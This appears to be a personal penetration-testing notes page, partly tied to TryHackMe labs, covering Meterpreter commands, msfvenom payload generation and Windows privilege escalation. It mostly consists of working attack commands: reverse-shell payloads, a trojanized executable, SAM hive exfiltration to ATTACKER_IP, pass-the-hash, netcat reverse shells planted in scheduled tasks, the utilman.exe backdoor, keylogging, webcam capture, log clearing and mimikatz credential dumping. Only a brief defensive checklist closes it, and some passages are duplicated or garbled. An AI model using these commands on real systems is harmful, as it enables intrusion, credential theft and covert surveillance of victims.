- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
# Commands
## Core commands

| Option       | Description                                            |
| ------------ | ------------------------------------------------------ |
| `background` | Backgrounds the current session                        |
| `exit`       | Terminate the Meterpreter session                      |
| `guid`       | Get the session GUID (Globally Unique Identifier)      |
| `help`       | Displays the help menu                                 |
| `info`       | Displays information about a Post module               |
| `irb`        | Opens an interactive Ruby shell on the current session |
| `load`       | Loads one or more Meterpreter extensions               |
| `migrate`    | Allows you to migrate Meterpreter to another process   |
| `run`        | Executes a Meterpreter script or Post module           |
| `sessions`   | Quickly switch to another session                      |
## File system commands

| Option                   | Description                                                   |
| ------------------------ | ------------------------------------------------------------- |
| `cd`                     | Will change directory                                         |
| `ls`                     | Will list files in the current directory (dir will also work) |
| `pwd`                    | Prints the current working directory                          |
| `edit`                   | will allow you to edit a file                                 |
| `cat`                    | Will show the contents of a file to the screen                |
| `rm`                     | Will delete the specified file                                |
| `rmdir`                  | Will delete a folder.                                         |
| `search`                 | Will search for files                                         |
| `upload local_path_file` | Will upload a file or directory                               |
| `download`               | Will download a file or directory                             |
## Networking commands

| Option                                     | Description                                                |
| ------------------------------------------ | ---------------------------------------------------------- |
| `arp`                                      | Displays the host ARP (Address Resolution Protocol) cache  |
| `ifconfig`                                 | Displays network interfaces available on the target system |
| `netstat`                                  | Displays the network connections                           |
| `route`                                    | Allows you to view and modify the routing table            |
| `portfwd`                                  | Forwards a local port to a remote service                  |
| `portfwd add -l 8080 -p 80 -r 10.0.2.3`    | lport 8080, rport 80, rhost 10.0.2.3                       |
| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                                     |
| `portfwd list`                             | List porforwarding configs                                 |
## System commands

| Option       | Description                                          |
| ------------ | ---------------------------------------------------- |
| `sysinfo`    | Gets information about the remote system, such as OS |
| `getuid`     | Shows the user that Meterpreter is running as        |
| `clearev`    | Clears the event logs                                |
| `execute`    | Executes a command                                   |
| `getpid`     | Shows the current process identifier                 |
| `kill`       | Terminates a process                                 |
| `pkill`      | Terminates processes by name                         |
| `ps`         | Lists running processes                              |
| `reboot`     | Reboots the remote computer                          |
| `shell`      | Drops into a system command shell                    |
| `shutdown`   | Shuts down the remote computer                       |
| `show_mount` | Show mount drivers                                   |
## Keylogger
| Option          | Description                 |
| --------------- | --------------------------- |
| `keyscan_start` | Starts capturing keystrokes |
| `keyscan_stop`  | tops capturing keystrokes   |
| `keyscan_dump`  | Dumps the keystroke buffer  |
## Sniffer

| Option               | Description     |
| -------------------- | --------------- |
| `use sniffer`        | Use             |
| `sniffer_interfaces` | Show interfaces |
| `snifer_start`       |                 |
| `snifer_stats`       | Show stats      |
| `snifer_stop`        |                 |
| `snifer_dumps`       |                 |
## Webcam

| Option          | Description                                    |
| --------------- | ---------------------------------------------- |
| `webcam_chat`   | Starts a video chat                            |
| `webcam_list`   | Lists webcams                                  |
| `webcam_snap`   | Takes a snapshot from the specified webcam     |
| `webcam_stream` | Plays a video stream from the specified webcam |
## Activity
Get a kit of features, screenshots, webcam, keylogger.

| Option           | Description        |
| ---------------- | ------------------ |
| `load beholder`  | Load               |
| `beholder_start` | Start the beholder |
## Other commands
These will be listed under different menu categories in the help menu

| Option        | Description                                                 |
| ------------- | ----------------------------------------------------------- |
| `idletime`    | Returns the number of seconds the remote user has been idle |
| `screenshare` | Allows you to watch the remote user's desktop in real time  |
| `screenshot`  | Grabs a screenshot of the interactive desktop               |
| `record_mic`  | Records audio from the default microphone for X seconds     |
| `getsystem`   | Attempts to elevate your privilege to that of local system  |
| `hashdump`    | Dumps the contents of the SAM database                      |
| `getprivs`    | Show privileges                                             |
| `timestomp`   | Modify timestamps of files on the system.                   |
| `run vnc`     | Run an [[vnc\|vnc]] in a machine.                                |
# Versions available
- Android
- Apple iOS
- Java
- Linux

| Option                              | Description           |
| ----------------------------------- | --------------------- |
| `linux/x86/meterpreter_reverse_tcp` | Linux 32bit stageless |
- OSX
- PHP
- Python
- Windows

| Option                                | Description                              |
| ------------------------------------- | ---------------------------------------- |
| `windows/x64/meterpreter/reverse_tcp` | Windows 64bit staged Meterpreter payload |
# Post explotation
- `getuid` This will give you an idea of your possible privilege level on the target system - NT AUTHORITY\SYSTEM or a regular user?
- The `ps` command will list running processes. The PID column will also give you the PID information you will need to **migrate Meterpreter to another process.**

## Post explotation Phases
- Gathering further information about the target system.
- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
- Privilege escalation.
- Lateral movement.

## Migrate
- if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.),
- you can migrate to it and start **capturing keystrokes** sent by the user to this process
- Some Meterpreter versions will offer the `keyscan_start`, or others commands options to make Meterpreter act like a **keylogger**.
- may also help you to have a **more stable** Meterpreter **session**.
- **Alert** you **may lose** your user **privileges** **if you migrate from a higher privileged** (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You **may not be able to gain them back.**
- By default meterpreter 
  `powershell.exe x86 User-PC\User C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe`
- look for a process
  ` 2244  488   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe`

| Option                    | Description          |
| ------------------------- | -------------------- |
| `migrate -N PROCESS_NAME` | Using the name       |
| `migrate PID_NUMBER`      | Using the PID number |
## Hashdump
- will **list** the content of the **[[SAM\|SAM]] database**
- These hashes can also be used in [[Pass-the-Hash\|Pass-the-Hash]] attacks
## Search
- useful to locate **files with** potentially **juicy information**
- In a CTF context, this can be used to quickly **find a flag or proof file,**
- In penetration testing engagements, may need to search for **user-generated files** or c**onfiguration files** that may contain **password or account information.**
```shell-session
search -f flag2.txt
```
## Shell
- Launch a regular command-line shell on the target system
- CTRL+Z will help you go back to the Meterpreter shell.
```sh
shell
```
## powershell
Get a powershell on meterpreter
```shell
load powershell
powershell_shell
```

## Persistence
Background
```shell
use exploit/windows/local/persistence_service
use exploit/windows/local/persistence
```
- Use 
`windows/x64/shell/reverse_https`

Forground
```shell
run exploit/windows/local/persistence args1[val1] args2[val2]
```
## Crack hash
```shell
use auxiliary/analize/jtr_crack_fast
```

## Enumerating gathering
### Windows
To run all below
```shell
run winenum
```

Aplications in the computer
```shell
use  post/windows/gather/enum_applications
set session 47
```
Devices, peripheral
```shell
use post/windows/gather/enum_devices
set session 47
```
Files
```shell
use post/windows/gather/enumfiles
```
Internet explorer
```shell
use post/windows/gather/enum_ie
```
Users
```shell
use post/windows/gather/enum_logged_on_users
```
Licenses
```shell
use post/windows/gather/enum_ms_product_keys
```
Browsers history (malicious pages xx)
```shell
use post/windows/gather/browser_history
```
Drivers (write permissions)
```shell
use post/windows/gather/forensics/enum_drivers
```
Environment variables
```shell
use post/multi/gather/env
```
Hashdump
```shell
use post/windows/gather/hashdump
```
Hashdump after trying  escalate
```shell
use post/windows/gather/smart_hashdump
```
### Linux
```shell
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_users_history
use post/linux/gather/enum_protections
use post/linux/busybox/enum_connections
use post/linux/gather/hashdump
```
# Extensions
To show list of extensions
```sh
use -l
```
## stdapi
- Default
## Single sign on credential collector
```shell
use post/windows/gather/credential/sso
```
### kiwi mimikatz
 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To windows
- On recent versions are parched
- Password dumping tool

| Option                                            | Description                                                 |
| ------------------------------------------------- | ----------------------------------------------------------- |
| `load kiwi`                                       | Load                                                        |
| `creds_all`                                       | Retrieve all credentials (parsed)                           |
| `lsa_dump_secrets`                                | Dump LSA secrets (unparsed)                                 |
| `lsa_dump_sam`                                    | Dump LSA SAM (unparsed)                                     |
| `golden_ticket_create`                            | Create a golden kerberos ticket to [[Golden ticket attack\|Golden ticket attack]] |
| `password_change -u user -n hashNTLM -P password` | Change the password/hash of a user                          |
When use `creds_all` allows us to steal this password out of memory even without the user 'Dark' logged in **if a scheduled task** runs the Icecast as the user 'Dark'.

</div></div>

# Some modules
## To scan vuln on windows
```shell
run multi/recon/local_exploit_suggester
```
## Enable [[RDP\|RDP]]
```shell
run post/windows/manage/enable_rdp
```


</div></div>


# Encoders
- Encoders **do not aim to bypass antivirus** installed on the target system
- **Encode** the payload.
- Can be effective against **some antivirus** software
- Use with `-e`

| Option         | Description                                                 |
| -------------- | ----------------------------------------------------------- |
| `-f <format>`  | Specifies the output format.                                |
| `-o <file>`    | The output location and filename for the generated payload. |
| `LHOST=<IP>`   | Specifies the IP to connect back to.                        |
| `LPORT=<port>` | The port on the local machine to connect back to.           |
| `--platform`   | specificity paltorm                                         |
| `-a`           | specificity arch                                            |
| `-i 10`        | Interate, times to encode                                   |
| `-e`           | Especify the encoder method                                 |
The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
Staged
``` shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```

 To get access with [[Notes/Netcat\|Netcat]] 
``` shell
msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
```
# FIle templates
- Set payload into a existent file
- Doesn't work on all programs

| Option   | Description                                |
| -------- | ------------------------------------------ |
| `-x`     | Set the original program                   |
| `--keep` | Try to keep the original app functionality |
Windows
```shell
msfvemon -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 25 -x original_app.exe --keep -f exe -o new_app.exe
```

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Like socat and netcat
- used to **receive reverse shells.**
- fully-fledged way to obtain stable shells
- with a wide variety of further options to improve the caught shell.
- only way to interact with a _meterpreter_ shell
- the easiest way to handle _staged_ payloads
- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
``` shell
use exploit/multi/handler
```
set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
`php/meterpreter/reverse_tcp`
```bash
set payload php/reverse_php
setg LHOST 192.x.x.x
setg LPORT 47
```

Example to DVWA (Damn Vulnerable Web Application)
``` sh
set payload php/reverse_php
set lhost 10.0.2.19
set lport 7777
run
```

send seasson to background
```
background
```

Start a listener in the background
```sh
exploit -j
```
Then we needed to use `sessions 1` to foreground it again.


</div></div>


</div></div>

Put it on the corresponding folder
Grant permissions to `Everyone` to execute the payload:
```powershell
icacls C:\Users\thm-unpriv\rev-svc.exe /grant Everyone:F
```
Change the service's associated executable and account (**mind the spaces after the equal signs when using sc.exe**)
```powershell
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
```

<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/notes/netcat/#listener-revershell" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">



### Listener revershell
Start a listener using rlwrap to try to simulate an interactive console
``` sh
rlwrap nc -lnvp 4747
```

</div></div>

Restart the service.
```powershell
sc stop THMService
sc start THMService
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Service Object Permissions

</div>


 - Los permisos de servicio mal configurados pueden permitir a un atacante modificar o reconfigurar los atributos asociados a ese servicio
- Al explotar tales servicios, los atacantes pueden incluso añadir nuevos usuarios al grupo de administradores locales y luego secuestrar la nueva cuenta para elevar sus privilegios

</div></div>

## Abusing dangerous privileges
 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Rights that an account has to perform specific system-related tasks.
- Check them `whoami /priv`
- List of windows privileges [[List of windows privileges\|List of windows privileges]]
- List of Windows [[Exploitable privileges\|Exploitable privileges]].

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing SeBackup-SeRestore

</div>


- Allow any user **read and write** to any **file** in the system, **ignoring** any [[DACL\|DACL]]
- The idea is allow to certain users **perform backups without** full **admin privileges**
- An attacker can use many methods to escalate.

Example:
- One method consists of **coping the [[SAM\|SAM]]** and  SYSTEM `registry hives` to **extract** the local Administrator's **password hash.**
- The account is part of the "Backup Operators" group, granted the 2 privileges above

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Backup the SAM ans SYSTEM hashes
Create a file with the `registry hives` content:
```cmd
reg save hklm\system C:\Users\THMBackup\system.hive
```

```cmd
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

</div></div>


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Start simple smb server

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# smbserver
- [[smbserver.py\|smbserver.py]]
- Start a simple [[SMB\|SMB]] server
- Create a share named `public` pointing to the `share` directory
- On the attacker machine
```shell
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbserver.py
mkdir share
python smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

</div></div>


</div></div>

Copy to the attacker machine
```powershell
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
Retrieve passwords hashes

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# secretsdump
- [[secretsdump.py\|secretsdump.py]]
- Retrieve the users' password hashes:
- Dump hashes from the remote machine without executing any agent there.
```shell
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py
python secretsdump.py -sam sam.hive -system system.hive LOCAL
```

</div></div>

Perform a [[Pass-the-Hash\|Pass-the-Hash]] attack

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# psexec
- [[psexec.py\|psexec.py]]
- To exec a [[Pass-the-Hash\|Pass-the-Hash]] attack
- Gain access to the target machine with `SYSTEM` privileges
```shell
wget https://raw.githubusercontent.com/fortra/impacket/master/examples/psexec.py
python psexec.py -hashes aad...e:8...4f5 administrator@VICTIM_IP
```
![Pasted image 20240822233408.png](/img/user/attachments/Pasted%20image%2020240822233408.png)

</div></div>


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing SeTakeOwnership

</div>


- This privilege allows a user to **take ownership** of any object on the system.(**files or registry**)
- Search for a service running as `SYSTEM` and **take** ownership of the service's **executable**.

Example:
- Check privileges
```shell
whoami /priv
```
![Pasted image 20240823084610.png|600](/img/user/attachments/Pasted%20image%2020240823084610.png)

## Abusing utilman.exe
- We need GUI
- Built-on windows app to provide ease of access options during the lock screen
- Replace the original binary for a payload
- Take ownership
```powershell
takeown /f C:\Windows\System32\Utilman.exe
```
- Being the owner doesn't necessarily mean that we have privileges over it, but you can assign yourself any privileges you need.
- Give us full permissions
```powershell
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```
- Replace `utilman.exe` with a copy of `cmd.exe`  on the `C:\Windows\System32\` folder
```powershell
copy cmd.exe utilman.exe
```
- Lock the screen from the start button
![Pasted image 20240823094514.png|200](/img/user/attachments/Pasted%20image%2020240823094514.png)
- Click on `ease of access` button and get a command prompt
![Pasted image 20240823094611.png|500](/img/user/attachments/Pasted%20image%2020240823094611.png)
## Meterpreter
- If we have a meterpreter session we can migrate to most privileged account using [[meterpreter#Migrate\|meterpreter#Migrate]]

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing SeImpersonate - SeAssignPrimaryToken

</div>


- Allow to impersonate other user. (Spawn a process or thread)
- `LOCAL SERVICE` and `NETWORK SERVICE ACCOUNTS` already have such privileges to impersonate restricted accounts.
- [[ISS\|ISS]] create an restricted account called `iis apppool\defaultapppool`

Example
- Let's assume we have an [[FTP\|FTP]] service running with user `ftp`.
- Without impersonation, ff Ann login and try to access to her files, the `ftp` user try to access them using `ftp` token
![Pasted image 20240823104235.png|800](/img/user/attachments/Pasted%20image%2020240823104235.png)
- With Impersonation, the `ftp` user impersonate Ann and uses her token.
![Pasted image 20240823104521.png|800](/img/user/attachments/Pasted%20image%2020240823104521.png)
- As attacker, if we manage to take **control** of a **process** with the privileges above, we can **impersonate** any user **connecting** and **authenticating** to that process.
- To elevate privilages using such accounts we need.
	1. To spawn an malicious process to that user can connect and authenticate
	2. Find a way to force privileged users to connect and authenticate to the malicious process
	3.  We can use [[RogueWinRM\|RogueWinRM]]

Example
- Asumming we have a compromised website running on [[ISS\|ISS]] and we have an webshell
![Pasted image 20240823111923.png|500](/img/user/attachments/Pasted%20image%2020240823111923.png)

<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/notes/netcat/#listener-revershell" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">



### Listener revershell
Start a listener using rlwrap to try to simulate an interactive console
``` sh
rlwrap nc -lnvp 4747
```

</div></div>

Use the webshell to trigger the exploit (may take 2 min to work)
```powershell
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4747"
```
`-p` specify the executable to be run by the exploit
`-a` sets arguments to the `nc64.exe`
It's like `nc -e cmd.exe ATTACKER_IP 4747`
![Pasted image 20240823115456.png|500](/img/user/attachments/Pasted%20image%2020240823115456.png)


</div></div>

##  Abusing vulnerable software
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Abusing unpatched software

</div>


- As the drivers, organisations and users may not update the software regularly.
List software using [[wmic\|wmic]]
```powershell
wmic product get name,version,vendor
```
- Search for exploits on
[[Exploit-DB\|Exploit-DB]], [[packet storm\|packet storm]] google or github

[[Case study Druva InSync 6.6.3\|Case study Druva InSync 6.6.3]]

</div></div>

## Harvesting passwords
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Unattended lnstalls

</div>


- In wondows 32
- Los detalles de la instalación desatendida, como los ajustes de configuración utilizados durante el proceso de instalación, se almacenan en el archivo Unattend.xml.
- El archivo Unattend.xml se almacena en una de las siguientes ubicaciones:
```powershell
C:\Windows\Panther\\N de la siguiente manera
C:\Windows\Panther\NUnattend
C:\WindowsSystem32
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
Los atacantes explotan la información almacenada en Unattend.xml para escalar privilegios
you might encounter credentials:
```html
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



[[LFI-WordList-Windows\|LFI-WordList-Windows]]

| File          | Descriptoin                                                |
| ------------- | ---------------------------------------------------------- |
| `c:\boot.ini` | contains the boot options for computers with BIOS firmware |




</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Powershell History

</div>


It can be retrieved by using the following command from a `cmd.exe` prompt:
Only work on `cmd.exe`
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Saved windows credentials

</div>


- Windows allows us to **use other users' credentials.**
- Also gives the option to **save these credentials on the system**.
List saved credentials:
```powershell
cmdkey /list
```
Example(user `mike.katz`):
![Pasted image 20240820193302.png|400](/img/user/attachments/Pasted%20image%2020240820193302.png)
if you notice any credentials worth trying, try it.
```powershell
runas /savecred /user:USER_NAME_HERE cmd.exe
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### ISS Configuration

</div>



<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Internet Information Services
- default web server on Windows
- create an restricted account called `iis apppool\defaultapppool`

</div></div>


The config on websites on [[ISS\|ISS]] is stored in a file called `web.config`  and can store **password** for db or configured authentication mechanisms.
Might is on:
```powershell
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
Example
![Pasted image 20240820191513.png](/img/user/attachments/Pasted%20image%2020240820191513.png)

Quick way to find database connection strings on the file:
```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

</div></div>

### Retrieve Credentials From software
#### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### From PuTTY

</div>



<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- SSH client commonly found on Windows.
- **Instead** of having to specify a **connection**'s parameters **every single time,** users can **store sessions** where the IP, user and other configurations can be stored for later use.
- Don't allow store SSH password
- Store proxy config including authentication credentials.

</div></div>

Retrieve the stored proxy credentials.
```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
Simon Tatham is the creator of PuTTY
Example:
![Pasted image 20240820193930.png|500](/img/user/attachments/Pasted%20image%2020240820193930.png)

</div></div>

## Some easy ways
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scheduled Tasks

</div>


Can be `schtasks` or `at`
We can see tasks either lost its binary or it's using a binary you can modify.
General info:
```powershell
schtasks
```
Specific info
```powershell
schtasks /query /tn vulntask /fo list /v
```
![Pasted image 20240820201808.png|600](/img/user/attachments/Pasted%20image%2020240820201808.png)
**If we can** **modify** or overwrite the "Task to Run" **executable**, we can control what gets executed by the taskusr1 user, and **we have a simple priv escalation**
Check executable permissions.
```powershell
icacls
```

```powershell
icacls c:\tasks\schtask.bat
```
![Pasted image 20240820202243.png|600](/img/user/attachments/Pasted%20image%2020240820202243.png)
We have full access and can **modify** the file and **insert a payload**
For example, we have a revshell file `nc64.exe`
```powershell
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
Now wait to the schedule task runs again or run manually (less probable)
```powershell
schtasks /run /tn vulntask
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### AlwaysInstallElevated

</div>


- Windows installer files (also known as .msi files) are used to install applications on the system.
- Usually run with the level of the user.
- Can be configured to run with higher privileges

Requires 2 registry values to be set.
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
If it's correct, generate a malicious .msi file using [[Msfvenom\|Msfvenom]]
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
Run the handler
Copy to the msi to the victim and run it
```powershell
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## DLL hijacking

</div>


Replace the DLL by a malicious

![Pasted_image_20230909115418.png](/img/user/attachments/Pasted_image_20230909115418.png)
## Exploit know vulnerabilities

Tools
	Robber
	PowerSploit


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Library hijack

</div>


OSX
	Dylib hijadt
		Scanner to detect vuln
	Tool to make thje hijack
		OyUbhijack

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Spectre

</div>


- Vulnerabilidades encontradas en el diseño de los modernos chips procesadores de AMO, ARM e Intel.
- Los atacantes pueden aprovechar esta vulnerabilidad para leer ubicaciones de memoria adyacentes de un proceso y acceder a información para la que no está autorizado.
- Usando esta vulnerabilidad, un atacante puede incluso leer la memoria del kernel o realizar un ataque basado en la web usando JavaScript.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Named pipe impersonation

</div>


- In windows
- En Windows, Named Pipe con nombre proporcionan una comunicación legítima entre los sistemas en ejecución.
- Los atacantes a menudo explotan esta técnica para escalar privilegios en el sistema de la víctima a los de una cuenta de usuario que tiene mayores privilegios de acceso.
- Los atacantes utilizan herramientas como Metasplolt para realizar una impersonación de tuberías con nombre en un host de target.ç 
- Los atacantes utilizan comandos de Metasplolt como getsystem para obtener privilegios de nivel administrativo y extraer los hashes de las contraseñas de las cuentas de administrador/usuario.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Other techniques

</div>


- Manipulación de tokens de acceso
El sistema operativo Windows utiliza tokens de acceso para determinar el contexto de seguridad de un proceso o hilo.
Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones peligrosas evadiendo la detección.
- Aplicación Shimming
El marco de compatibilidad de aplicaciones de Windows llamado Shim se utiliza para proporcionar compatibilidad entre las versiones más antiguas y más nuevas del sistema operativo Windows Shims como RedirectEXE, injectDLL y GetProcAddress pueden ser utilizados por los atacantes para escalar privilegios, instalar puertas traseras, desactivar Windows Defender, etc.
- Debilidad de los permisos del sistema de archivos
El sistema operativo Windows utiliza tokens de acceso para determinar el contexto de seguridad de un proceso o hilo.
Los atacantes pueden obtener los tokens de acceso de otros usuarios o generar tokens falsos para conseguir privilegios y realizar acciones peligrosas evadiendo la detección.
- Interceptación de rutas
Las aplicaciones incluyen muchas debilidades y desconfiguraciones como rutas no citadas, desconfiguración de variables de entorno de la ruta y secuestro del orden de búsqueda que conducen a la interceptación de la ruta. La interceptación de rutas ayuda a un atacante a mantener la persistencia en un sistema y escalar privilegios.
- Lauch Deamon
Launchd se utiliza en el arranque de MacOS y OS X para completar el proceso de inicialización del sistema mediante la carga de parámetros para cada daemon de lanzamiento a nivel de sistema. Los daemons tienen plists que están vinculadas a ejecutables que se ejecutan en el arranque. El atacante puede alterar el ejecutable del daemon de lanzamiento para mantener la persistencia o para escalar privilegios.
- Plist Modification
Los archivos plist en MacOS y OS X describen cuándo deben ejecutarse los programas, la ruta del archivo ejecutable, los parámetros del programa, los permisos del sistema operativo necesarios, etc. Los atacantes alteran los archivos plist para ejecutar código malicioso en nombre de un usuario legítimo para escalar privilegios.
- Web Shell
Una shell web es un script basado en la web que permite el acceso a un servidor web. Los atacantes crean web shells para inyectar un script malicioso en un servidor web para mantener un acceso persistente y escalar privilegios.

![Pasted_image_20230909124442.png](/img/user/attachments/Pasted_image_20230909124442.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Tools to escalate

</div>


### BeRoot 
es una herramienta de post-explotación para comprobar las configuraciones  rróneas más comunes para encontrar una forma de elevar los privilegios. Como se muestra en la captura de pantalla, utilizando esta herramienta, los atacantes pueden obtener información sobre los permisos de los servicios, los directorios en los que se puede escribir con sus ubicaciones, los permisos de las claves de inicio, etc.
### linpostexp
La herramienta linpostexp obtiene información detallada sobre el kernel,
que puede ser utilizada para escalar privilegios en el sistema objetivo. Como se muestra en la captura de pantalla, utilizando esta herramienta, los atacantes pueden obtener información sobre el kernel, los sistemas de archivos, el superusuario, los sudoers, la versión de sudo, etc. Los atacantes pueden utilizar esta información para explotar las vulnerabilidades presentes en el kernel para elevar sus privilegios. El siguiente comando se utiliza para extraer esta información sobre el sistema de destino: #python linprivchecker.py


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## How to defend escalate Windows

</div>


■ Restringir los privilegios de inicio de sesión interactiva.
■ Ejecutar usuarios y aplicaciones con los privilegios más bajos.
■ Implementar la autenticación y la autorización multifactoriales.
■ Ejecutar servicios como cuentas sin privilegios.
■ Implementar una metodología de separación de privilegios para limitar el alcance de los errores y fallos de
programación.
■ Utilizar una técnica de cifrado para proteger los datos sensibles.
■ Reducir la cantidad de código que se ejecuta con un determinado privilegio.
■ Realizar la depuración utilizando comprobadores de límites y pruebas de esfuerzo.
■ Probar a fondo el sistema para detectar errores de codificación de la aplicación y bugs.
■ Parchear y actualizar periódicamente el kernel.
■ Cambiar la configuración del UAC a "Siempre notificar", de modo que aumente la visibilidad del usuario
cuando se solicite la elevación del UAC.
■ Restringir a los usuarios la escritura de archivos en las rutas de búsqueda de las aplicaciones.
■ Supervisar continuamente los permisos del sistema de archivos mediante herramientas de auditoría.
■ Reducir los privilegios de las cuentas y grupos de usuarios para que sólo los administradores legítimos
puedan realizar cambios en el servicio.
■ Utilizar herramientas de listas blancas para identificar y bloquear el software malicioso que cambia los
permisos de archivos, directorios o servicios.
■ Utilizar rutas totalmente cualificadas en todas las aplicaciones de Windows.
■ Asegúrese de que los ejecutables ali se colocan en directorios protegidos contra escritura.
■ En los sistemas operativos Mac, impida que los archivos plist sean alterados por los usuarios haciéndolos de
sólo lectura.
